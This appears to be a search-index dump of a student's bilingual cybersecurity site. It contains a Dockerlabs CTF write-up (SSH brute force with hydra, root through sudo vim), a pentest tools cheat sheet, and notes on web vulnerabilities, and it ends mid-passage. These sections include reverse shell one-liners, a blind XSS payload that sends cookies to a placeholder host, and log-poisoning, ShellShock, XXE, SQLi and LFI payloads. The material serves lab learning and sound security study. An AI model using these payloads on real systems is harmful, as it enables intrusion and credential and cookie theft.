/etc/hosts\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n       \u2502 File: /etc/hosts\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n   1   \u2502 127.0.0.1   localhost\n   2   \u2502 127.0.1.1   kali\n   3   \u2502 \n   4   \u2502 172.18.0.2  trust\n   5   \u2502 \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n</code></pre> <p>Accessing the website shows the default Apache page with no useful info, so we try to enumerate directories with gobuster:</p> <pre><code>\u276f gobuster dir -u http://trust/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -t 20 -x html,php,txt,php.bak\n\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://trust/\n[+] Method:                  GET\n[+] Threads:                 20\n[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              html,php,txt,php.bak\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/.php                 (Status: 403) [Size: 270]\n/.html                (Status: 403) [Size: 270]\n/index.html           (Status: 200) [Size: 10701]\n/secret.php           (Status: 200) [Size: 927]\n/.html                (Status: 403) [Size: 270]\n/.php                 (Status: 403) [Size: 270]\n/server-status        (Status: 403) [Size: 270]\n/logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.html (Status: 403) [Size: 270]\n/logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.php.bak (Status: 403) [Size: 270]\nProgress: 6369160 / 6369165 (100.00%)\n===============================================================\nFinished\n===============================================================\n</code></pre> <p>We find a hidden page <code>/secret.php</code> that says:</p> <pre><code>Hola Mario,\n\nEsta web no se puede hackear.\n</code></pre> <p></p> <p>So we assume a possible username is Mario. With no more info, the next step is brute-forcing SSH with hydra:</p> <pre><code>\u276f hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://trust\nHydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-18 20:05:43\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task\n[DATA] attacking ssh://trust:22/\n[22][ssh] host: trust   login: mario   password: chocolate\n1 of 1 target successfully completed, 1 valid password found\n[WARNING] Writing restore file because 2 final worker threads did not complete until end.\n[ERROR] 2 targets did not resolve or could not be connected\n[ERROR] 0 target did not complete\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-18 20:05:51\n</code></pre> <p>And we obtain the password chocolate.</p>"},{"location":"en/writeups/Trust/#privilege-escalation","title":"Privilege Escalation","text":"<p>Once inside, we stabilize the shell:</p> <pre><code>script /dev/null -c bash\nstty raw -echo; fg\nreset xterm\nexport TERM=xterm\n</code></pre> <p>Then we check what we can run with sudo:</p> <pre><code>mario@f29b3bbef1a5:~$ sudo -l\n[sudo] password for mario: \nMatching Defaults entries for mario on f29b3bbef1a5:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser mario may run the following commands on f29b3bbef1a5:\n    (ALL) /usr/bin/vim\n</code></pre> <p>We abuse this to spawn a root shell:</p> <pre><code>mario@f29b3bbef1a5:~$ sudo vim -c ':!/bin/bash'\n\nroot@f29b3bbef1a5:/home/mario# whoami\nroot\nroot@f29b3bbef1a5:/home/mario# \n</code></pre> <p>Root obtained!</p>"},{"location":"en/writeups/Trust/#lessons-learned","title":"Lessons Learned","text":"<ol> <li>Scans with nmap</li> <li>Fuzzing with gobuster</li> <li>Brute force attack with hydra</li> <li>Privilege escalation with vim</li> </ol>"},{"location":"es/","title":"Bienvenido a la Web Personal de Isa\u00edas","text":"<p>\u00a1Hola! Soy Isa\u00edas, estudiante de Ingenier\u00eda Inform\u00e1tica con enfoque en Tecnolog\u00edas de la Informaci\u00f3n y Ciberseguridad. Aqu\u00ed encontrar\u00e1s mis writeups, apuntes, proyectos y m\u00e1s.</p>"},{"location":"es/#disclaimer","title":"\u26a0\ufe0f Disclaimer","text":"<p>Este contenido es educativo y no debe usarse con fines maliciosos. Todo fue realizado en entornos controlados.</p>"},{"location":"es/#writeups","title":"Writeups","text":"<p>En este apartado encontrar\u00e1s mis WriteUps de m\u00e1quinas que he resuelto, cubriendo aspectos como Configuraci\u00f3n de entorno, Reconocimiento, Explotaci\u00f3n, Escalada de privilegios y Lecciones vistas.</p> <ul> <li>Dockerlabs<ul> <li>First Hacking </li> <li>Injection </li> <li>Trust </li> <li>Obsession</li> </ul> </li> </ul>"},{"location":"es/#apuntes","title":"Apuntes","text":"<p>En este apartado encontrar\u00e1s mis apuntes sobre temas como vulnerabilidads de ciberseguridad, tutoriales de herramientas de pentesting y m\u00e1s.</p> <ul> <li>Vulnerabilidades web mas comunes</li> <li>Herramientas de pentesting</li> </ul>"},{"location":"es/#proyectos","title":"Proyectos","text":"<p>En este apartado encontrar\u00e1s los proyectos que he realizado y en los que estoy trabajando (la mayor\u00eda se pueden ver en github).</p>"},{"location":"es/#enlaces","title":"Enlaces","text":"<ul> <li>Mi GitHub </li> <li>Mi repositorio de cibeseguridad</li> </ul>"},{"location":"es/notes/Tools/","title":"Herramientas de pentesting","text":""},{"location":"es/notes/Tools/#0-como-obtener-una-reverse-shell","title":"0. Como obtener una reverse shell","text":"<p>Primero de todo hemos de ejecutar en nuestra terminal el siguiente comando (nos da una tty sin tratar)</p> <pre><code>nc -nlvp {puerto}\n</code></pre> <p>Este comando nos hara estar en escucha en el puerto que determinemos en espera de que la m\u00e1quina v\u00edctima nos envie la reverse shell.</p> <ul> <li>Windows<ol> <li>Descargamos netcat</li> <li>Ejecutamos:</li> </ol> </li> </ul> <pre><code>./nc.exe {ip atacante} {puerto} -l cmd.exe\n</code></pre> <ul> <li>Linux<ol> <li>Ejecutamos:</li> </ol> </li> </ul> <pre><code>bash -i &gt;&amp; /dev/tcp/{ip atacante}/{puerto} 0&gt;&amp;1 \n</code></pre> <p>Una vez obtenida la reverse shell, para poder manejar la terminal de una manera mas sencilla, hacemos el siguiente tratamiento:</p> <pre><code>script /dev/null -c bash\nstty raw -echo; fg\nreset xterm\nexport TERM=xterm\n</code></pre> <p>As\u00ed ya podemos interactuar desde una tty completamente interactiva. </p>"},{"location":"es/notes/Tools/#1-arp-scan","title":"1. arp-scan","text":"<p>La herramienta arp-scan sirve para escanear toda la red (la que le indicamos, en este caso es solo la red local) para encontrar la @IP de la m\u00e1quina v\u00edctima. El comando mas utilizado es:</p> <pre><code>arp-scan -I {iface} --localnet\n</code></pre> <p>Donde el parametro iface corresponde a la interfaz de red que deseemos.</p>"},{"location":"es/notes/Tools/#2-nmap","title":"2. nmap","text":"<p>La herramienta nmap sirve para hacer escaneos de puertos. Esta herramienta es muy vers\u00e1til, y se pueden realizar muchos tipos de escaneos. Los m\u00e1s \u00fatiles son los siguientes</p>"},{"location":"es/notes/Tools/#21-enumeracion-de-puertos","title":"2.1. Enumeraci\u00f3n de puertos","text":"<p>Un primer escaneo para enumerar los puertos abiertos (y poder utilizar la utilidad extractPorts para verlos y copiarlos en el clipboard)</p> <pre><code>nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn {@IP victim} -oG allPorts\n</code></pre> <p>A continuaci\u00f3n explicamos cada par\u00e1metro:</p> <ol> <li>-p- \u2192 escanea todos los puertos</li> <li>--open \u2192 filtra solo los puertos abiertos</li> <li>sS \u2192 aplica un escaneo con stelf scan (que es mas sigiloso porque no hace el 3 way handshake)</li> <li>--min-rate 5000\u2192 no queremos que vaya mas lento que 5000 paquetes por segundo</li> <li>-vvv \u2192 triple verbose para que a medida que vaya encontrando puertos los vaya reportando por pantalla</li> <li>-n \u2192 para que no haga resoluci\u00f3n DNS y vaya mas r\u00e1pido</li> <li>-Pn \u2192 evita hacer un ping</li> <li>-oG allPorts\u2192 exporta el resultado en formato grepeable al fichero que le digamos (en este caso allPorts)</li> </ol> <p>Gracias a que lo hemos exportado en un fichero en formato grepeable, podemos ejecutar una utilidad llamada extractPorts para obtener la informaci\u00f3n mas relevante:</p> <pre><code>extractPorts allPorts\n</code></pre>"},{"location":"es/notes/Tools/#22-extraccion-de-informacion-de-los-puertos","title":"2.2. Extracci\u00f3n de informaci\u00f3n de los puertos","text":"<p>Una vez ya tenemos los puertos listados, podemos realizar un segundo escaneo mas exhaustivo, mediante el siguiente comando</p> <pre><code>nmap -sCV -p{PUERTOS COPIADOS} {@IP v\u00edctima} -oN targeted\n</code></pre> <p>A continuaci\u00f3n explicamos cada par\u00e1metro:</p> <ol> <li>-sCV \u2192 el parametro sC hace que se ejecuten todos los scripts de escaneo de nmap, y el parametro V te incluye tambien la version de los puertos que corren.</li> <li>-p \u2192 sirve para pasarle los puertos</li> <li>-oN targeted \u2192 lo exporta en formato normal (tal y como se ve en la terminal) al archivo targeted</li> </ol> <p>De esta manera, tenemos dos archivos. El primero es allPorts y es donde tenemos los puertos guardados en formato grepeable para poder ejecutar la utilidad extractPorts. El segundo fichero es el fichero targeted que esta guardado en formato normal para poder consultar en cualquier momento toda la informaci\u00f3n de los puertos mediante el comando:</p> <pre><code>cat -l ruby targeted\n</code></pre> <p>Estos escaneos son los mas b\u00e1sicos, ya que a medida que vayamos avanzando, igual interesa listar puertos cerrados, puertos filtrados...</p>"},{"location":"es/notes/Tools/#3-searchsploits","title":"3. Searchsploits","text":"<p>Esta herramienta es muy \u00fatil para buscar vulnerabilidades de servicios una vez hecho el escaneo, puesto que lista todos los exploits que encuentra en las bases de datos.</p> <pre><code>searchsploits {servicio y version}\n</code></pre> <p>A pesar de que esta herramienta muestra un repertorio de exploits, es tambien interesante buscar mas en internet (sobre todo en github).</p>"},{"location":"es/notes/Tools/#4-msfvenom","title":"4. Msfvenom","text":"<p>Esta herramienta se utiliza para generar payloads personalizados para una amplia variedad de sistemas operativos y arquitecturas. Para ello, lo primero que hay que hacer es listar los payloads, y filtrarlos mediante grep con palabras clave. El comando para listar payloads es el siguiente</p> <pre><code>msfvenom -l\n</code></pre> <p>Una vez ya hemos encontrado el payload que nos interesa, para poder guardarnoslo en nuestra m\u00e1quina hay que ejecutar el siguiente comando</p> <pre><code>msfvenom -p {payload} LHOST={@ip atacante} LPORT={puerto de escucha} -f {tipo de fichero} -o {filename.extension}\n</code></pre>"},{"location":"es/notes/Tools/#5-nessus","title":"5. Nessus","text":"<p>Otra herramienta para hacer un escaneo y reportar vulnerabilidades es Nessus. Nessus es un servicio que corre en el puerto 8834 en nuestro ordenador (en el localhost) con el servicio HTTPS. Para poder utilizarlo, primero hay que iniciar el servicio mediante</p> <pre><code>systemctl start nessusd.service\n</code></pre> <p>Y una vez ya est\u00e1 corriendo, mediante un navegador web, debemos acceder a https://localhost:8834. Cuando nos encontramos ya dentro de nessus, para iniciar un nuevo escaneo hay que persionar el boton \"New Scan\" situado en la esquina superior derecha, lo que nos redirige a una p\u00e1gina con una amplia selecci\u00f3n de posibles escaneos. Los mas utilizados son - Advanced Scan \u2192 es un escaneo lento, pero que reporta las posibles vulnerabilidades - Host Discovery \u2192 escaneo muy b\u00e1sico (no es tan \u00fatil)</p>"},{"location":"es/notes/Tools/#6-burpsuite","title":"6. Burpsuite","text":"<p>Burpsuite es un proxy de interceptacion, que hace de intermediario entre una p\u00e1gina web y el atacante, para poder gestionar manualmente los request y response. Para acceder se puede acceder desde el rofi, desde la terminal con el comando \"burpsuite\" o con el atajo \"Super + shift + b\" (en mi kali linux al menos).</p>"},{"location":"es/notes/Tools/#7-gobuster","title":"7. Gobuster","text":"<p>Gobuster es una herramienta que permite enumerar directorios en una web mediante un diccionario. A este ataque se le llama FUZZING, y es \u00fatil sobre todo para recopilar informaci\u00f3n. El comando mas utilizado es el siguiente:</p> <pre><code>gobuster dir -w {diccionario} -u {URL} -t {numero de threads} -x {extensiones}\n</code></pre> <ul> <li>Diccionario \u2192 diccionario que se utilizar\u00e1 para hacer el fuzzing. Los mas comunes son:<ul> <li>/usr/share/wordlists/dirb/common.txt</li> <li>/usr/share/wordlsists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt</li> </ul> </li> <li>URL \u2192 la url sobre la que se realizar\u00e1 el ataque. Por ejemplo http://{ip victima}</li> <li>Numero de threads \u2192 numero de threads utilizados en el ataque (para que vaya mas r\u00e1pido). Por ejemplo 20</li> <li>Extensiones \u2192 extensiones que pueden tener los directorios (html,php,txt,php.bak). Para esto es mejor usar el diccionario de SecLists</li> </ul>"},{"location":"es/notes/Tools/#8-hash-identifier-john-the-ripper","title":"8. Hash-identifier + John The Ripper","text":"<p>Estas dos herramientas se suelen utilizar en conjunto, ya que la primera, hash-identifier sirve para identificar el tipo de hash con el que esta encriptada una cadena y John The Ripper sirve para desencriptarla (para utilizarla es necesario pasarle por par\u00e1metro el tipo de hash). Los comandos son los siguientes:</p> <pre><code>hash-identifier\njohn --format=Raw-{Tipo hash} --wordlist={diccionario} {fichero con el hash}\n</code></pre> <p>El diccionario por excelencia es \"/usr/share/wordlists/rockyout.txt\".</p>"},{"location":"es/notes/Tools/#9-hydra","title":"9. Hydra","text":"<p>Hydra es una herramienta para ejecutar ataques de fuerza bruta. Para este ataque es necesario saber el servicio al que se va a intentar hacer el ataque (FTP, SSH, HTTP...) y es recomendable saber una de las dos credenciales (o usuario o contrase\u00f1a) ya que si no conocemos ninguna y ejecutamos el ataque de fuerza bruta con dos diccionarios puede llegar a tardar mucho. A continuacion ponemos los 3 casos mas comunes con FTP (para cambiar de servicio solo hay que cambiar ftp por el servicio que sea (ssh, http,...))</p> <pre><code>hydra -l {user} -P {diccionario} ftp://{ip v\u00edctima}\nhydra -L {diccionario} -p {password} ftp://{ip v\u00edctima}\nhydra -L {diccionario} -P {diccionario} ftp://{ip v\u00edctima} (esta es mejor no hacerla, tarda mucho)\n</code></pre>"},{"location":"es/notes/Tools/#10-wfuzz","title":"10. Wfuzz","text":"<p>Herramienta que sirve para enumerar subdominios de una web. El comando que se utiliza es el siguiente:</p> <pre><code>wfuzz -c --nc 400 -t 200 -w &lt;diccionario&gt; -v &lt;dominio&gt; -H \"HOST: FUZZ.&lt;dominio&gt;\"\n</code></pre> <p>De esta manera, el comando wfuzz busca subdominios cambiando la palabra FUZZ por los subdominios del diccionario.</p>"},{"location":"es/notes/Tools/#11-base64","title":"11. Base64","text":"<p>Esto es muy \u00fatil y sale mucho (se utiliza mucho). Para decodificar cadenas en base64 ejecutamos el siguiente comando:</p> <pre><code>echo \"cadena_base64\" | base64 --decode\n</code></pre> <p>Para codificar en base64, se ejecuta lo siguiente:</p> <pre><code>echo \"texto\" | base64\n</code></pre>"},{"location":"es/notes/Tools/#12-whatweb","title":"12. WhatWeb","text":"<p>Herramienta de c\u00f3digo abierto dise\u00f1ada para identificar las tecnolog\u00edas utilizadas en sitios web. WhatWeb puede detectar sistemas de gesti\u00f3n de contenido (CMS), plataformas de blogs, paquetes de an\u00e1lisis estad\u00edstico, bibliotecas de JavaScript, servidores web y dispositivos embebidos. Adem\u00e1s, es capaz de identificar n\u00fameros de versi\u00f3n, direcciones de correo electr\u00f3nico, identificadores de cuentas, m\u00f3dulos de frameworks web, errores SQL y m\u00e1s. El comando utilizado es el siguiente:</p> <pre><code>whatweb http://ejemplo.com\n</code></pre>"},{"location":"es/notes/VulnerabilityWeb/","title":"Apuntes de las Vulnerabilidades web mas comunes","text":""},{"location":"es/notes/VulnerabilityWeb/#1-local-file-inclusion-lfi","title":"1. Local File Inclusion (LFI)","text":"<p>Permite a un atacante incluir archivos locales del servidor, t\u00edpicamente mediante par\u00e1metros vulnerables: - https://localhost/myweb.php?idioma=es \u2192 https://localhost/myweb.php?idioma=/etc/passwd Evasi\u00f3n y trucos:</p> <ul> <li>Si solo permite <code>.txt</code>, prueba null byte injection:<ul> <li>https://localhost/myweb.php?idioma=/etc/passwd%00.txt`</li> <li>El <code>%00</code> termina la cadena antes de que a\u00f1adan <code>.txt</code> internamente (antiguo truco PHP, pero a\u00fan puede funcionar en entornos legacy).</li> </ul> </li> <li>Si restringen a una ruta espec\u00edfica (<code>/var/www/html/lang/</code>) \u2192 Path Traversal:<ul> <li><code>https://localhost/myweb.php?idioma=../../../../../../etc/passwd</code> (Prueba tambi\u00e9n con <code>.</code> codificado (<code>%2e</code>) o combinaciones como <code>%2e%2e/</code> para saltarte filtros)</li> </ul> </li> </ul>"},{"location":"es/notes/VulnerabilityWeb/#2-wrappers","title":"2. Wrappers","text":"<p>PHP tiene \"envoltorios\" como <code>php://input</code> o <code>data://</code> que permiten acceder a flujos como si fueran archivos. Permiten acceder a flujos como si fueran archivos:</p> <ul> <li><code>php://input</code> \u2192 Accede al cuerpo de la petici\u00f3n (POST)</li> <li><code>data://</code> \u2192 Ejecuta datos embebidos como archivo</li> <li><code>file://</code> \u2192 Accede a archivos locales</li> <li><code>zip://</code>, <code>phar://</code>, <code>glob://</code>, etc. Puedes enviar tu propio c\u00f3digo PHP en el body con un <code>POST</code> y se ejecutar\u00e1.</li> </ul>"},{"location":"es/notes/VulnerabilityWeb/#3-log-poisoning","title":"3. Log Poisoning","text":"<p>Cuando tenemos LFI, podemos enumerar archivos LOGs (la mayor\u00eda se encuentran en /var/log). De esta manera, si podemos encontrar logs de registro de acceso por ejemplo, podemos ejecutar comandos haciendo accesos con c\u00f3digo php, i que se interpreten al acceder al log. Se basa en inyectar c\u00f3digo malicioso en archivos de log, que luego son incluidos mediante LFI.</p> <pre><code>curl -s -H \"User-Agent: &lt;?php system('whoami'); ?&gt;\" \"http://localhost/myweb.php?file=/var/log/apache2/access.log\"\n</code></pre>"},{"location":"es/notes/VulnerabilityWeb/#4-remote-file-inclusion-rfi","title":"4. Remote File Inclusion (RFI)","text":"<p>Similar al LFI pero permitiendo incluir archivos remotos, como scripts maliciosos. Pero cuidado, porque solo funciona si <code>allow_url_include</code> est\u00e1 activado.</p>"},{"location":"es/notes/VulnerabilityWeb/#5-html-injection","title":"5. HTML Injection","text":"<p>Inyectar HTML (no JavaScript) en una p\u00e1gina. No ejecuta JS, pero puede usarse para phishing o manipular el DOM.</p> <pre><code>&lt;b&gt;\u00a1Hola admin!&lt;/b&gt;&lt;form action=\"...\"&gt;\n</code></pre> <p>Tambi\u00e9n puede permitirte meter un <code>&lt;img src=\"javascript:...\"&gt;</code> o un <code>&lt;form&gt;</code> trampa.</p>"},{"location":"es/notes/VulnerabilityWeb/#6-cross-site-scripting-xss","title":"6. Cross-Site Scripting (XSS)","text":"<p>Inyecci\u00f3n de JavaScript en p\u00e1ginas web. Con esto puedes: - Robar cookies - Secuestrar sesiones - Modificar el DOM - Redirigir al usuario Ejemplo cl\u00e1sico: <code>&lt;script&gt;alert('XSS');&lt;/script&gt;</code></p>"},{"location":"es/notes/VulnerabilityWeb/#7-blind-xss","title":"7. Blind XSS","text":"<p>Similar al XSS, pero el payload se ejecuta en otra parte (ej: panel de admin). En este caso, el caso b\u00e1sico ser\u00eda meter <code>&lt;script&gt;fetch('https://tuyo.com?c='+document.cookie)&lt;/script&gt;</code> en un campo. No ves nada, pero cuando el admin entra le puedes robar las cookies.</p>"},{"location":"es/notes/VulnerabilityWeb/#8-cross-site-request-forgery-csrf","title":"8. Cross-Site Request Forgery (CSRF)","text":"<p>Enga\u00f1as a un usuario logueado para que haga una acci\u00f3n sin querer (cambiar su contrase\u00f1a, transferencias...) \u2192 haces que el navegador de otro mande una petici\u00f3n sin que lo sepa. Ejemplo: <code>&lt;img src=\"http://victima.com/change_password?new=1234\" /&gt;</code> \u2192 Si la sesi\u00f3n est\u00e1 activa, cambia la contrase\u00f1a sin preguntar. Soluci\u00f3n: usar tokens CSRF y comprobar m\u00e9todos (GET/POST).</p>"},{"location":"es/notes/VulnerabilityWeb/#9-server-side-request-forgery-ssrf","title":"9. Server-Side Request Forgery (SSRF)","text":"<p>Usas el servidor como proxy para hacer peticiones internas (acceder a <code>127.0.0.1</code>, metadatos en la nube, etc). Ideal para escanear la red interna o acceder a servicios restringidos (admin panels internos, metadata cloud...).</p>"},{"location":"es/notes/VulnerabilityWeb/#10-sql-injection-error-based","title":"10. SQL Injection / Error-Based","text":"<p>Inyecci\u00f3n de SQL que revela errores \u00fatiles para explotaci\u00f3n.</p> <pre><code>' OR 1=1 --\n</code></pre> <p>Si los errores se muestran, puedes exfiltrar datos f\u00e1cilmente:</p> <pre><code>' UNION SELECT null, version(), database() --\n</code></pre>"},{"location":"es/notes/VulnerabilityWeb/#11-sql-injection-time-based-blind","title":"11. SQL Injection / Time-Based (Blind)","text":"<p>No ves errores, pero puedes inferir la respuesta usando funciones como <code>SLEEP()</code>:</p> <pre><code>' OR IF(1=1, SLEEP(5), 0) --\n</code></pre> <p>Si tarda 5 segundos\u2026 algo va bien (hemos descubierto SQLi blind).</p>"},{"location":"es/notes/VulnerabilityWeb/#12-padding-oracle-attack-padbuster","title":"12. Padding Oracle Attack (Padbuster)","text":"<p>Ataque contra cifrados por bloques (como CBC) usando errores para deducir el padding y descifrar info. Si una cookie cifrada provoca diferentes errores seg\u00fan el padding, se puede descifrar byte a byte. Una herramienta cl\u00e1sica es padbuster.pl.</p>"},{"location":"es/notes/VulnerabilityWeb/#13-padding-oracle-attack-bit-flipper-burpsuite","title":"13. Padding Oracle Attack (Bit Flipper / BurpSuite)","text":"<p>Misma idea que el Padding Oracle Attack, pero en vez de descifrar, modificas contenido\u2192 modificas bits del ciphertext para forzar un resultado concreto tras el descifrado (como elevar privilegios). Un ejemplo ser\u00eda cambiar <code>user=normal</code> a <code>user=admin</code> flipping bits hasta que el descifrado te da privilegios elevados.</p>"},{"location":"es/notes/VulnerabilityWeb/#14-shellshock","title":"14. ShellShock","text":"<p>Vulnerabilidad en Bash que permite ejecutar comandos inyectados en variables de entorno. Ejecutar comandos al pasar valores maliciosos en headers o variables de entorno. Afecta a servidores CGI antiguos.</p> <pre><code>User-Agent: () { :; }; /bin/bash -c 'id'\n</code></pre>"},{"location":"es/notes/VulnerabilityWeb/#15-xml-external-entity-injection-xxe","title":"15. XML External Entity Injection (XXE)","text":"<p>Ataque a parsers XML que permiten definir entidades externas, lo que permite leer archivos o hacer SSRF. Peligroso en APIs SOAP/XML.</p> <pre><code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt; ]&gt;\n&lt;root&gt;&amp;xxe;&lt;/root&gt;\n</code></pre>"},{"location":"es/notes/VulnerabilityWeb/#16-blind-xxe","title":"16. Blind XXE","text":"<p>Igual que XXE, pero no ves la respuesta. Tienes que usar un \"canal lateral\", como forzar peticiones DNS:</p> <pre><code>&lt;!ENTITY % ext SYSTEM \"http://tuo.dominio.com/pwn\"&gt;\n</code></pre>"},{"location":"es/notes/VulnerabilityWeb/#17-domain-zone-transfer-axfr","title":"17. Domain Zone Transfer (AXFR)","text":"<p>Obtener toda la zona DNS de un dominio si el servidor DNS est\u00e1 mal configurado.</p> <pre><code>dig axfr @dns.victima.com victima.com\n</code></pre>"},{"location":"es/notes/VulnerabilityWeb/#18-deserialization-attacks","title":"18. Deserialization Attacks","text":"<p>Env\u00edo de datos serializados (como objetos PHP, Java, Python...) que al deserializar ejecutan c\u00f3digo malicioso. Ejemplo en PHP:</p> <pre><code>O:8:\"Exploit\":1:{s:4:\"data\";s:13:\"&lt;?php info(); ?&gt;\";}\n</code></pre>"},{"location":"es/notes/VulnerabilityWeb/#19-type-juggling","title":"19. Type Juggling","text":"<p>Explotar c\u00f3mo PHP (u otros lenguajes) comparan tipos distintos (strings vs ints):</p> <pre><code>if ($_POST['auth'] == \"0e12345\") // vulnerable\n</code></pre> <p>Autenticaci\u00f3n bypass.</p>"},{"location":"es/notes/VulnerabilityWeb/#20-virtual-hosting","title":"20. Virtual Hosting","text":"<p>Dentro del mismo puerto se pueden ejecutar mas de 1 subdominio web, y para listarlos podemos usar la herramienta wfuzz</p>"},{"location":"es/writeups/FirstHacking/","title":"Write Up First Hacking","text":"<p>Dificultad: Super f\u00e1cil Enlace a dockerlabs: https://dockerlabs.es/</p>"},{"location":"es/writeups/FirstHacking/#configuracion-del-entorno","title":"Configuraci\u00f3n del entorno","text":"<p>Primero de todo desplegamos la m\u00e1quina mediante el script que viene al descargar la m\u00e1quina</p> <pre><code>\u276f sudo ./auto_deploy.sh firsthacking.tar\n\nEstamos desplegando 